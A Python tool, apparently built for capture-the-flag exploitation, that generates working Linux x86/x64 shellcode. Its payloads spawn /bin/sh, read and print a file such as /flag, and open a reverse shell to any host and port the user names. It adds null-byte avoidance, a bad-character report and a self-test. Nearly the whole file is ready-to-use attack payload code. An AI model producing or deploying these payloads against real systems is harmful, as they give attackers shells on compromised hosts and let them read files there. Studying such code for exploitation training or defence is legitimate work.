#!/usr/bin/env python3
"""sc_gen.py -- emit tested x86/x64 shellcode stubs (shellcraft fallback).

Usage:
  python3 tools/sc_gen.py execve64
  python3 tools/sc_gen.py execve86
  python3 tools/sc_gen.py cat64 --path /flag
  python3 tools/sc_gen.py rev64 --host 10.10.0.5 --port 4444
  python3 tools/sc_gen.py --selftest

pwntools/shellcraft are absent here, so these are hand-verified
canonical stubs. cat64 pushes the path string in 8-byte chunks
then open/read/write loops to stdout. rev64 does socket/connect/
dup2x3/execve with the IP packed big-endian and the port
big-endian u16. Output reports which bytes appear so a badchar
filter check is one look; --raw prints only the hex string.
"""
import argparse
import json
import struct
import sys


def push_str64(s):
    """x64: push NUL-terminated s on the stack, rsp -> s.
    Chunks whose u64 has trailing null bytes are loaded with 0x58
    filler and shifted right so no 0x00 lands in the machine code."""
    b = s.encode() if isinstance(s, str) else s
    b += b"\x00" * (-len(b) % 8)
    code = b"\x48\x31\xc0\x50"                    # xor rax; push rax
    for i in range(len(b) - 8, -1, -8):
        chunk = b[i:i + 8]
        k = 0
        while k < 8 and chunk[7 - k] == 0:
            k += 1
        if k:
            fill = chunk[:8 - k] + b"\x58" * k
            code += (b"\x48\xb8" + fill + b"\x48\xc1\xe8"
                     + bytes([k * 8]) + b"\x50")
        else:
            code += b"\x48\xb8" + chunk + b"\x50"
    return code


def _execve64():
    return (b"\x48\x31\xc0"                       # xor rax,rax
            b"\x50"                               # push rax
            b"\x48\xb8" + b"//bin/sh"             # movabs rax, "//bin/sh"
            b"\x50"                               # push rax
            b"\x48\x89\xe7"                       # mov rdi,rsp
            b"\x48\x31\xf6"                       # xor rsi,rsi
            b"\x48\x31\xd2"                       # xor rdx,rdx
            b"\xb0\x3b"                           # mov al,59 (execve)
            b"\x0f\x05")                          # syscall


def _execve86():
    return (b"\x31\xc0"                           # xor eax,eax
            b"\x50"                               # push eax
            b"\x68//sh"                           # push "//sh"
            b"\x68/bin"                           # push "/bin"
            b"\x89\xe3"                           # mov ebx,esp
            b"\x50"                               # push eax
            b"\x53"                               # push ebx
            b"\x89\xe1"                           # mov ecx,esp
            b"\x31\xd2"                           # xor edx,edx
            b"\xb0\x0b"                           # mov al,11 (execve)
            b"\xcd\x80")                          # int 0x80


def _cat64(path):
    return (push_str64(path)
            + b"\x48\x89\xe7"                     # mov rdi,rsp (path)
            + b"\x31\xf6"                         # xor esi,esi (O_RDONLY)
            + b"\x6a\x02\x58"                     # push 2; pop rax (open)
            + b"\x0f\x05"                         # syscall
            + b"\x48\x89\xc7"                     # mov rdi,rax (fd)
            + b"\x48\x89\xe6"                     # mov rsi,rsp (buf)
            + b"\x6a\x50\x5a"                     # push 80; pop rdx
            + b"\x31\xc0"                         # xor eax,eax (read)
            + b"\x0f\x05"                         # syscall
            + b"\x89\xc2"                         # mov edx,eax
            + b"\x6a\x01\x5f"                     # push 1; pop rdi (stdout)
            + b"\x6a\x01\x58"                     # push 1; pop rax (write)
            + b"\x0f\x05")                        # syscall


def _rev64(host, port):
    ip = struct.unpack(">I",
                       bytes(int(x) for x in host.split(".")))[0]
    pswap = ((port & 0xFF) << 8) | (port >> 8)    # sin_port is big-endian
    return (b"\x6a\x29\x58"                       # socket syscall 41
            b"\x6a\x02\x5f"                       # AF_INET
            b"\x6a\x01\x5e"                       # SOCK_STREAM
            b"\x31\xd2"                           # xor edx
            b"\x0f\x05"                           # syscall
            b"\x48\x89\xc7"                       # mov rdi,rax (fd)
            b"\x48\xb8" + struct.pack("<Q",
                (ip << 32) | (pswap << 16) | 2) + # sockaddr_in {AF_INET,
                                                # port BE, ip BE} as u64
            b"\x50"                               # push rax
            b"\x48\x89\xe6"                       # mov rsi,rsp
            b"\x6a\x10\x5a"                       # push 16; pop rdx
            b"\x6a\x2a\x58"                       # push 42; pop rax (connect)
            b"\x0f\x05"                           # syscall
            b"\x6a\x03\x5e"                       # push 3; pop rsi
            b"\x48\xff\xce"                       # dec rsi
            b"\x6a\x21\x58"                       # push 33; pop rax (dup2)
            b"\x0f\x05"                           # syscall
            b"\x75\xf6"                           # jnz -10 (dup2 loop)
            ) + _execve64()


def _selftest():
    e = _execve64()
    assert e[-2:] == b"\x0f\x05" and b"//bin/sh" in e, e.hex()
    assert len(e) <= 30
    x = _execve86()
    assert b"/bin" in x and b"//sh" in x and x[-2:] == b"\xcd\x80"
    c = _cat64("/flag")
    assert b"/flag" in c and b"\x00" not in c, c.hex()
    r = _rev64("10.10.0.5", 4444)
    assert r.count(b"\x0f\x05") == 4, r.hex()
    sin = struct.pack("<Q", (0x0A0A0005 << 32) | (0x5C11 << 16) | 2)
    assert sin in r, r.hex()
    print("sc_gen selftest: ok")


def main():
    ap = argparse.ArgumentParser(description="emit shellcode stubs")
    ap.add_argument("what", nargs="?",
                    choices=["execve64", "execve86", "cat64", "rev64"])
    ap.add_argument("--path", default="/flag")
    ap.add_argument("--host")
    ap.add_argument("--port", type=int)
    ap.add_argument("--raw", action="store_true")
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        return _selftest()
    if not a.what:
        ap.error("what required")
    if a.what == "execve64":
        code = _execve64()
    elif a.what == "execve86":
        code = _execve86()
    elif a.what == "cat64":
        code = _cat64(a.path)
    else:
        if not (a.host and a.port):
            ap.error("rev64 needs --host --port")
        code = _rev64(a.host, a.port)
    if a.raw:
        print(code.hex())
    else:
        bad = sorted({b for b in code
                      if b in b"\x00\x0a\x0d\x20"})
        print(json.dumps({
            "name": a.what, "len": len(code),
            "hex": code.hex(),
            "bad_bytes": [f"0x{b:02x}" for b in bad],
            "note": "verify no forbidden bytes for the input channel"},
            indent=1))


if __name__ == "__main__":
    raise SystemExit(main())
